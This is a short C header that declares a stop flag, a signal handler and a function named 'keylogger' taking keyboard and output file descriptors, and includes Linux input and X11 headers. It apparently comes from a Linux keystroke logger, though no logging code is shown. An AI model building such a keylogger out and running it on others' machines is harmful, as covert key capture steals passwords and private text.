#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <time.h>
#include <ctype.h>
#include <stdbool.h>
#include <signal.h>
#include <X11/Xlib.h>
#include <X11/Xatom.h>

extern volatile sig_atomic_t stopLogging;

void stopHandler(int sig);
void keylogger(int keyboard, int writeout);
